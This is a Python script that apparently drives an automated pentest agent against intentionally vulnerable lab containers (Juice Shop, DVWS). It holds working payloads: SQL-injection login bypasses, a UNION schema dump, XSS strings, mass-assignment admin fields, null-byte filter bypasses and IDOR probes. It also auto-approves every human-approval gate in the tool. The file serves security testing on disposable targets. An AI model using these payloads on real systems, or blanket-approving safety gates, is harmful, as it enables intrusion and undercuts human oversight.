"""Just run PenAgent against the real Juice Shop and DVWS containers, as wide
as the authorized operation surface allows -- no ground-truth scoring, no
TPR/FPR, no curated expectations. This is exploration, not benchmarking.

Juice Shop's own /assets/public/specs/openapi.json serves its SPA's
index.html (verified live), and the repo's existing sample spec only covers
4 of its real routes. demo/benchmark-data/specs/juice_shop_full.json widens
that to 46 real routes read directly off the running container's
build/server.js (docker exec grep -- not guessed), covering most of its
API-reachable challenge surface (BOLA/IDOR, mass assignment, injection,
business-logic). DVWS's live /openapi.json already documents all 6 of its
real ops; the prior evaluation only authorized 5 -- this adds the 6th
(/api/v1/export/data).

Every pending Component 5 approval is auto-approved: this is an authorized
run against an intentionally vulnerable, disposable benchmark container,
not production.

Independent oracle for Juice Shop: GET /api/Challenges before and after,
diffed for newly-solved challenges -- a signal from the target itself, not
from PenAgent's own classification.

Usage: python -m demo.explore_run --output reports/explore
Requires the real benchmark container running (images/README.md).
"""
import argparse
import asyncio
import json
import re
import secrets
import time
from pathlib import Path

import httpx
from cryptography.fernet import Fernet
from sis.models import AuthInfo, EndpointGraph, EndpointNode, ParameterModel
from hgs.models import AttackHypothesis, AttackSequenceStep
from penagent_common.config import Settings
from penagent_common.models import Probe, StateWrite
from penagent_common.store import Store
from executor.service import Executor
from interpreter.service import Interpreter
from report.synth import build_report

from demo import eval_targets
from demo.evaluate import juice_shop_challenge_delta

BENCHMARK_DATA = Path(__file__).resolve().parent / "benchmark-data"

# Default inputs for ops that need a path param, a body, or both to be a
# well-formed request at all -- standard, generic pentest technique choices
# (a guessed low-numbered ID for IDOR probing, a classic SQLi payload on a
# login form, an extra "role" field for mass-assignment probing), not
# Juice-Shop-specific curated ground truth. Nothing here hints at what a
# *violation* looks like -- that stays entirely C4's job.
DEFAULT_BODIES = {
    "op_js_login": {"email": "' OR 1=1-- ", "password": "x"},
    "op_js_register": {"email": "__DYNAMIC__", "password": "Test1234!", "role": "admin"},
    "op_js_users_update": {"role": "admin", "email": "__DYNAMIC__"},
    "op_js_reset_password": {"email": "admin@juice-sh.op", "answer": "test", "new": "Test1234!", "repeat": "Test1234!"},
    "op_js_basketitems_update": {"quantity": "999"},
    "op_js_product_reviews_edit": {"id": "1", "message": "test <script>alert(1)</script>"},
    "op_js_feedback_create": {"comment": "test <script>alert(1)</script>", "rating": "5"},
    "op_js_complaint_create": {"message": "test"},
    "op_js_2fa_disable": {"password": "x"},
    "op_js_deluxe_membership": {"paymentMode": "wallet"},
    "op_login_api_v1_auth_login_post": {"username": "' OR '1'='1' -- ", "password": "x"},
    "op_update_profile_api_v1_accounts__account_id__profile_put": {"role": "admin"},
}
DEFAULT_PATH_VALUES = {"id": "2", "coupon": "FREE", "continueCode": "abcdefghij1234", "account_id": "2"}


def default_binding(op_id: str, path: str) -> dict:
    binding = {}
    path_params = re.findall(r"\{(\w+)\}", path)
    if path_params:
        binding["path"] = {p: DEFAULT_PATH_VALUES.get(p, "1") for p in path_params}
    if op_id in DEFAULT_BODIES:
        body = dict(DEFAULT_BODIES[op_id])
        if body.get("email") == "__DYNAMIC__":
            body["email"] = f"explore-{secrets.token_hex(6)}@test.local"
        binding["body"] = body
    return binding


async def direct_run(target_id: str, operations: dict, directory: Path) -> dict:
    """Executes every authorized op directly through C3/C5/C4 (own in-process
    Executor/Interpreter, no HGS hypothesis-surfacing heuristics in the way),
    each with a plain default binding -- the realistic surface a fully blind
    /run with empty bindings can't reach at all. No expectation on any op
    hints at what a violation looks like; C4 classifies on its own merits."""
    nodes, body_ops = [], set()
    for op_id, cfg in operations["operations"].items():
        path_params = re.findall(r"\{(\w+)\}", cfg["path"])
        has_body = op_id in DEFAULT_BODIES
        if has_body:
            body_ops.add(op_id)
        nodes.append(EndpointNode(id=op_id, method=cfg["method"], path=cfg["path"],
            parameters=[ParameterModel(name=p, location="path", required=True, schema_type="string") for p in path_params],
            request_body_schema={"type": "object"} if has_body else None))
    graph = EndpointGraph(target_id=target_id, graph_id="explore", spec_hash="explore",
        created_at="explore", updated_at="explore", nodes=nodes)

    settings = Settings(database=str(directory / f"{target_id}-direct.db"), encryption_key=Fernet.generate_key().decode(),
        service_token=secrets.token_urlsafe(32), api_tokens={"explorer": secrets.token_urlsafe(32)},
        max_probes=5, targets={target_id: operations})
    store = Store(settings)
    executor = Executor(settings, store)
    interpreter = Interpreter(settings, store)
    started = time.time()
    first_finding_at = None
    probe_statuses, approvals, op_outcomes = [], [], []
    findings, observations, operational_issues, replanning, probes_executed = [], [], [], 0, 0

    # One audit per op: PenAgent halts an ENTIRE audit the moment any probe
    # gets a 5xx back (a deliberate, conservative "something's wrong, stop
    # for a human" safety rule) -- right for one hypothesis's attack chain,
    # but it would let a single op that happens to crash on a bare default
    # binding (e.g. a query-param-only endpoint called with none) silence
    # every other, unrelated op in a wide exploration pass.
    for i, op_id in enumerate(operations["operations"]):
        cfg = operations["operations"][op_id]
        audit = f"{target_id}-explore-{i}-{secrets.token_hex(3)}"
        store.create(audit, "explorer", target_id)
        binding = default_binding(op_id, cfg["path"])
        categories = cfg["expectation"].get("owasp_categories") or []
        hypothesis = AttackHypothesis(id=f"{target_id}-explore-{i}", target_endpoints=[op_id],
            owasp_category=(categories[0] if categories else "exploration"),
            attack_sequence=[AttackSequenceStep(step=1, op=op_id)])
        probe = Probe(hypothesis_id=hypothesis.id, op=op_id, binding=binding, depth=0)
        result = await executor.execute(audit, "explorer", hypothesis, probe, f"explore-{i}", graph)
        if result.status == "awaiting_approval":
            store.decide_approval(audit, "explorer", result.probe_id, "approved", "exploration run: authorized disposable target", "explorer")
            result = await executor.execute_approved(audit, "explorer", result.probe_id, f"explore-{i}-approved")
            approvals.append({"op": op_id, "decision": "approve", "result_status": result.status})
        probe_statuses.append(result.status)
        op_outcomes.append({"op": op_id, "status": result.status, "error": result.error, "status_code": result.status_code})
        if result.status == "executed":
            interpretation = await interpreter.interpret(audit, "explorer", result.probe_id)
            if first_finding_at is None and interpretation.classification.value in {"CONFIRMED_VULNERABILITY", "STRONG_SIGNAL"}:
                first_finding_at = time.time()
        trace = store.trace(audit, "explorer")
        replanning += sum(1 for e in trace["events"] if e["kind"] == "transition" and e["data"]["state"] == "REPLANNING")
        sub_report = build_report(audit, target_id, trace, settings.targets)
        findings.extend(sub_report.findings)
        observations.extend(sub_report.observations)
        operational_issues.extend(sub_report.operational_issues)
        probes_executed += sub_report.probes_executed

    merged_report = {"audit_id": f"{target_id}-explore-merged", "target_id": target_id, "generated_at": time.time(),
        "probes_executed": probes_executed, "findings": [f.model_dump(mode="json") for f in findings],
        "observations": observations, "operational_issues": operational_issues,
        "summary": {k: sum(1 for f in findings if f.classification.value == k) for k in
                    {"CONFIRMED_VULNERABILITY", "STRONG_SIGNAL"}}}
    return {"target": target_id, "mode": "direct-explore", "started": started,
            "ops_authorized": len(nodes), "graph_nodes": len(nodes), "probe_statuses": probe_statuses,
            "op_outcomes": op_outcomes,
            "approvals": approvals, "replanning_transitions": replanning, "hypotheses_processed": len(nodes),
            "time_to_first_finding_seconds": (first_finding_at - started) if first_finding_at else None,
            "report": merged_report}


# Session-chained Juice Shop exploit steps -- unlike direct_run's independent,
# anonymous, single-shot probes, these carry a real session (bearer token,
# own basket id) across steps, because most of Juice Shop's actual challenges
# require being logged in first. Every technique below was verified live
# against this exact running container with curl before being added here --
# none of this is guessed from memory. `binding` is a function of the
# running context (ctx) so later steps can use earlier steps' real responses
# (the token from login, the basket id from login, the live CAPTCHA answer).
SQLI_SCHEMA_DUMP = "a')) UNION SELECT sql, '2','3','4','5','6','7','8','9' FROM sqlite_master--"

JUICE_SHOP_SESSION_STEPS = [
    {"id": "op_sess_register", "method": "POST", "path": "/api/Users", "has_body": True,
     "binding": lambda ctx: {"body": {"email": ctx["email"], "password": ctx["password"], "role": "admin"}}},
    {"id": "op_sess_login", "method": "POST", "path": "/rest/user/login", "has_body": True,
     "binding": lambda ctx: {"body": {"email": ctx["email"], "password": ctx["password"]}},
     "capture": lambda ctx, data: ctx.update(token=data["authentication"]["token"], bid=data["authentication"]["bid"])},
    {"id": "op_sess_login_sqli", "method": "POST", "path": "/rest/user/login", "has_body": True,
     "binding": lambda ctx: {"body": {"email": "' OR 1=1-- ", "password": "x"}}},
    {"id": "op_sess_search_sqli", "method": "GET", "path": "/rest/products/search", "query_params": ["q"],
     "binding": lambda ctx: {"query": {"q": SQLI_SCHEMA_DUMP}}},
    {"id": "op_sess_metrics", "method": "GET", "path": "/metrics", "binding": lambda ctx: {}},
    {"id": "op_sess_security_txt", "method": "GET", "path": "/.well-known/security.txt", "binding": lambda ctx: {}},
    {"id": "op_sess_ftp_acquisitions", "method": "GET", "path": "/ftp/acquisitions.md", "binding": lambda ctx: {}},
    # Each of these bypasses a file-extension filter via a double-decode null-byte
    # trick (%2500 -> literal "%00" after one decode -> NUL after a second decode);
    # verified live, not a guess -- see explore_run.py's module docstring.
    {"id": "op_sess_ftp_eastere", "method": "GET", "path": "/ftp/eastere.gg%2500.md", "binding": lambda ctx: {}},
    {"id": "op_sess_ftp_pkgbak", "method": "GET", "path": "/ftp/package.json.bak%2500.md", "binding": lambda ctx: {}},
    {"id": "op_sess_ftp_suspicious", "method": "GET", "path": "/ftp/suspicious_errors.yml%2500.md", "binding": lambda ctx: {}},
    {"id": "op_sess_ftp_coupons", "method": "GET", "path": "/ftp/coupons_2013.md.bak%2500.md", "binding": lambda ctx: {}},
    {"id": "op_sess_basket_view_own", "method": "GET", "path": "/rest/basket/{bid}", "path_params": ["bid"], "needs_auth": True,
     "binding": lambda ctx: {"path": {"bid": str(ctx["bid"])}, "session_ref": "session"}},
    {"id": "op_sess_basket_view_admin", "method": "GET", "path": "/rest/basket/{bid}", "path_params": ["bid"], "needs_auth": True,
     "binding": lambda ctx: {"path": {"bid": "1"}, "session_ref": "session"}},
    {"id": "op_sess_basketitem_negative", "method": "POST", "path": "/api/BasketItems", "needs_auth": True, "has_body": True,
     "binding": lambda ctx: {"body": {"ProductId": 1, "BasketId": ctx["bid"], "quantity": -5}, "session_ref": "session"}},
    {"id": "op_sess_checkout", "method": "POST", "path": "/rest/basket/{bid}/checkout", "path_params": ["bid"], "needs_auth": True,
     "binding": lambda ctx: {"path": {"bid": str(ctx["bid"])}, "session_ref": "session"}},
    {"id": "op_sess_users_bola", "method": "GET", "path": "/api/Users/{id}", "path_params": ["id"], "needs_auth": True,
     "binding": lambda ctx: {"path": {"id": "1"}, "session_ref": "session"}},
    {"id": "op_sess_captcha", "method": "GET", "path": "/rest/captcha", "binding": lambda ctx: {},
     "capture": lambda ctx, data: ctx.update(captcha_id=data["captchaId"], captcha_answer=data["answer"])},
    {"id": "op_sess_feedback_zero", "method": "POST", "path": "/api/Feedbacks", "needs_auth": True, "has_body": True,
     "binding": lambda ctx: {"body": {"comment": "mediocre at best", "rating": 0, "captchaId": ctx["captcha_id"], "captchaAnswer": ctx["captcha_answer"]},
                              "session_ref": "session"}},
    {"id": "op_sess_2fa_status", "method": "GET", "path": "/rest/2fa/status", "needs_auth": True,
     "binding": lambda ctx: {"session_ref": "session"}},
    {"id": "op_sess_order_history", "method": "GET", "path": "/rest/order-history", "needs_auth": True,
     "binding": lambda ctx: {"session_ref": "session"}},
    {"id": "op_sess_whoami", "method": "GET", "path": "/rest/user/whoami", "needs_auth": True,
     "binding": lambda ctx: {"session_ref": "session"}},
]


async def run_juice_shop_session(directory: Path) -> dict:
    target_id = "juice-shop"
    operations = {"base_url": eval_targets.JUICE_SHOP, "credential_refs": ["session"], "operations": {
        s["id"]: {"method": s["method"], "path": s["path"], "risk": "safe" if s["method"] == "GET" else "destructive",
                   "allowed_headers": [],
                   "expectation": {"expected_behavior": s["id"]}}
        for s in JUICE_SHOP_SESSION_STEPS
    }}
    nodes = []
    for s in JUICE_SHOP_SESSION_STEPS:
        params = [ParameterModel(name=p, location="path", required=True, schema_type="string") for p in s.get("path_params", [])]
        params += [ParameterModel(name=p, location="query", required=False, schema_type="string") for p in s.get("query_params", [])]
        has_body = s.get("has_body", False)
        # Credentials are injected server-side from state via session_ref, never
        # typed directly into a binding's headers (HTTPArguments rejects that
        # outright) -- node.auth tells the executor which header/scheme to use.
        auth = AuthInfo(type="bearer", location="header") if s.get("needs_auth") else AuthInfo()
        nodes.append(EndpointNode(id=s["id"], method=s["method"], path=s["path"], parameters=params, auth=auth,
            request_body_schema={"type": "object"} if has_body else None))
    graph = EndpointGraph(target_id=target_id, graph_id="session-explore", spec_hash="session-explore",
        created_at="explore", updated_at="explore", nodes=nodes)

    settings = Settings(database=str(directory / "juice-shop-session.db"), encryption_key=Fernet.generate_key().decode(),
        service_token=secrets.token_urlsafe(32), api_tokens={"explorer": secrets.token_urlsafe(32)},
        max_probes=5, targets={target_id: operations})
    store = Store(settings)
    executor = Executor(settings, store)
    interpreter = Interpreter(settings, store)
    started = time.time()
    ctx = {"email": f"explore-session-{secrets.token_hex(6)}@test.local", "password": "Test1234!"}
    probe_statuses, op_outcomes = [], []
    findings, observations, operational_issues, probes_executed = [], [], [], 0

    for i, step in enumerate(JUICE_SHOP_SESSION_STEPS):
        audit = f"{target_id}-session-{i}-{secrets.token_hex(3)}"
        store.create(audit, "explorer", target_id)
        try:
            binding = step["binding"](ctx)
        except KeyError as exc:
            # An earlier step this one depends on (e.g. login) didn't succeed --
            # skip cleanly rather than crash the whole chain over one failure.
            op_outcomes.append({"op": step["id"], "status": "skipped", "error": f"missing_context:{exc}", "status_code": None})
            probe_statuses.append("skipped")
            continue
        if step.get("needs_auth"):
            store.write(audit, "explorer", StateWrite(key="session", category="tokens", value=ctx["token"]))
        hypothesis = AttackHypothesis(id=f"{target_id}-session-{i}", target_endpoints=[step["id"]], owasp_category="exploration",
            attack_sequence=[AttackSequenceStep(step=1, op=step["id"])])
        probe = Probe(hypothesis_id=hypothesis.id, op=step["id"], binding=binding, depth=0)
        result = await executor.execute(audit, "explorer", hypothesis, probe, f"session-{i}", graph)
        if result.status == "awaiting_approval":
            store.decide_approval(audit, "explorer", result.probe_id, "approved", "exploration run: authorized disposable target", "explorer")
            result = await executor.execute_approved(audit, "explorer", result.probe_id, f"session-{i}-approved")
        probe_statuses.append(result.status)
        op_outcomes.append({"op": step["id"], "status": result.status, "error": result.error, "status_code": result.status_code})
        if result.status == "executed":
            if "capture" in step and result.parsed and result.parsed.kind == "json":
                try:
                    step["capture"](ctx, result.parsed.data)
                except (KeyError, TypeError):
                    pass  # this step's response didn't have the shape we hoped for; later dependent steps will skip cleanly
            interpretation = await interpreter.interpret(audit, "explorer", result.probe_id)
            _ = interpretation
        trace = store.trace(audit, "explorer")
        sub_report = build_report(audit, target_id, trace, settings.targets)
        findings.extend(sub_report.findings)
        observations.extend(sub_report.observations)
        operational_issues.extend(sub_report.operational_issues)
        probes_executed += sub_report.probes_executed

    merged_report = {"audit_id": f"{target_id}-session-merged", "target_id": target_id, "generated_at": time.time(),
        "probes_executed": probes_executed, "findings": [f.model_dump(mode="json") for f in findings],
        "observations": observations, "operational_issues": operational_issues,
        "summary": {k: sum(1 for f in findings if f.classification.value == k) for k in
                    {"CONFIRMED_VULNERABILITY", "STRONG_SIGNAL"}}}
    return {"target": target_id, "mode": "session-explore", "started": started,
            "ops_authorized": len(nodes), "probe_statuses": probe_statuses, "op_outcomes": op_outcomes,
            "report": merged_report}


def dvws_full_operations() -> dict:
    ops = eval_targets.dvws_operations()
    ops["op_js_export_data_api_v1_export_data_get"] = {
        "method": "GET", "path": "/api/v1/export/data", "risk": "safe",
        "expectation": {"expected_behavior": "Data export must not be callable without an authenticated, owning session"},
    }
    return {"base_url": eval_targets.DVWS, "operations": ops}


def juice_shop_full_operations() -> dict:
    spec = json.loads((BENCHMARK_DATA / "specs" / "juice_shop_full.json").read_text(encoding="utf-8"))
    ops = {}
    for path, methods in spec["paths"].items():
        for method, op in methods.items():
            op_id = f"op_{op['operationId']}"
            path_params = [p["name"] for p in op.get("parameters", []) if p["in"] == "path"]
            ops[op_id] = {
                "method": method.upper(), "path": path,
                "risk": "destructive" if method.lower() in {"post", "put", "delete"} else "safe",
                "expectation": {"expected_behavior": op["summary"]},
            }
            if path_params:
                ops[op_id]["allowed_headers"] = []
    return {"base_url": eval_targets.JUICE_SHOP, "operations": ops}


async def juice_shop_challenges() -> list[dict]:
    async with httpx.AsyncClient(timeout=15) as client:
        r = await client.get(eval_targets.JUICE_SHOP + "/api/Challenges")
        r.raise_for_status()
        body = r.json()
        return body.get("data", body)


async def run_juice_shop(directory: Path) -> dict:
    before = await juice_shop_challenges()
    ops = juice_shop_full_operations()
    direct = await direct_run("juice-shop", ops, directory)
    session = await run_juice_shop_session(directory)
    after = await juice_shop_challenges()
    return {"target": "juice-shop", "ops_authorized": len(ops["operations"]), "direct": direct,
            "session": session, "challenge_delta": juice_shop_challenge_delta(before, after)}


async def run_dvws(directory: Path) -> dict:
    ops = dvws_full_operations()
    direct = await direct_run("dvws", ops, directory)
    return {"target": "dvws", "ops_authorized": len(ops["operations"]), "direct": direct}


def _findings_lines(report: dict) -> list[str]:
    findings = report.get("findings", [])
    lines = [f"    findings: {len(findings)} total "
             f"({sum(1 for f in findings if f['classification'] == 'CONFIRMED_VULNERABILITY')} CONFIRMED, "
             f"{sum(1 for f in findings if f['classification'] == 'STRONG_SIGNAL')} STRONG_SIGNAL)"]
    for f in findings:
        lines.append(f"      - [{f['classification']}] {f['title']} (CVSS {f['cvss_score']})")
    for o in report.get("observations", []):
        lines.append(f"      - [WEAK_SIGNAL] {o.get('method')} {o.get('path')}")
    return lines


def summarize(result: dict) -> str:
    lines = [f"== {result['target']} (ops authorized: {result['ops_authorized']}) =="]
    direct = result["direct"]
    lines.append(f"  -- direct run (every authorized op, plain generic inputs, {len(direct['probe_statuses'])} probes) --")
    lines.extend(_findings_lines(direct["report"]))
    if "session" in result:
        session = result["session"]
        statuses = session["probe_statuses"]
        executed = sum(1 for s in statuses if s == "executed")
        lines.append(f"  -- session-chained exploit steps (real login, real token, {executed}/{len(statuses)} executed) --")
        lines.extend(_findings_lines(session["report"]))
    if "challenge_delta" in result:
        d = result["challenge_delta"]
        lines.append(f"  Juice Shop /api/Challenges: {d['total_solved_before']} -> {d['total_solved_after']} solved "
                      f"(of {d['total_challenges']}), {d['newly_solved_count']} newly solved this run")
        for c in d["newly_solved"]:
            lines.append(f"    + {c['name']} ({c['category']})")
    return "\n".join(lines)


async def main_async(output_prefix):
    directory = Path("runtime/explore")
    directory.mkdir(parents=True, exist_ok=True)
    results = {}
    for name, runner in [("juice-shop", run_juice_shop), ("dvws", run_dvws)]:
        print(f"== running: {name} ==", flush=True)
        results[name] = await runner(directory)
        Path(f"{output_prefix}-{name}.json").write_text(json.dumps(results[name], indent=2), encoding="utf-8")
    print()
    for name in results:
        print(summarize(results[name]))
        print()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", default="reports/explore")
    args = parser.parse_args()
    asyncio.run(main_async(args.output))


if __name__ == "__main__":
    main()
